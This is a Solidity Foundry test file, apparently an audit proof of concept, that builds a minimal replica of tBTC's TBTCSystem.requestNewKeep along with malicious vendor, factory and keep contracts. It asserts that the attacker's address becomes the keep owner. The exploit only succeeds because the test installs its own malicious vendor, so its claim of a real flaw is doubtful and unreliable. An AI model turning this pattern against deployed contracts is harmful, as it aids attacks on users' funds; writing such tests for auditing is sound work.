// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";

// Minimal interfaces (stubs)
interface IBondedECDSAKeepVendor { function selectFactory() external view returns (address); }
interface IBondedECDSAKeepFactory { function openKeep(uint256 _n, uint256 _m, address _owner, uint256 _bond) external payable returns (address); }

// Malicious keep that records the owner passed by the factory
contract MaliciousKeep {
    address public owner;
    constructor(address _owner) { owner = _owner; }
}

// Factory that creates MaliciousKeep and trusts the owner argument
contract MaliciousFactory {
    function openKeep(uint256, uint256, address _owner, uint256) external payable returns (address) {
        MaliciousKeep k = new MaliciousKeep(_owner);
        return address(k);
    }
}

// Vendor that returns the malicious factory
contract MaliciousVendor {
    address factory;
    constructor(address _factory) { factory = _factory; }
    function selectFactory() external view returns (address) { return factory; }
}

// Minimal vulnerable replica: only the state + function touched by the PoC
contract TBTCSystem {
    address public keepVendor;
    constructor(address _keepVendor) { keepVendor = _keepVendor; }

    // Vulnerable: external callers can invoke an external factory with their own address
    function requestNewKeep(uint256 _m, uint256 _n, uint256 _bond)
        external
        payable
        returns (address)
    {
        IBondedECDSAKeepVendor _keepVendor = IBondedECDSAKeepVendor(keepVendor);
        IBondedECDSAKeepFactory _keepFactory = IBondedECDSAKeepFactory(_keepVendor.selectFactory());
        return _keepFactory.openKeep{value: msg.value}(_n, _m, msg.sender, _bond);
    }
}

contract TBTCSystemTest is Test {
    TBTCSystem target;
    address attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
        MaliciousFactory factory = new MaliciousFactory();
        MaliciousVendor vendor = new MaliciousVendor(address(factory));
        target = new TBTCSystem(address(vendor));
    }

    function test_attacker_exploits_requestNewKeep() public {
        vm.prank(attacker);
        // Attacker calls requestNewKeep and their address is forwarded to the factory
        address keep = target.requestNewKeep{value: 1 wei}(2, 3, 0);
        // The created keep records the owner as the attacker, demonstrating privilege/control
        assertEq(MaliciousKeep(keep).owner(), attacker);
    }
}

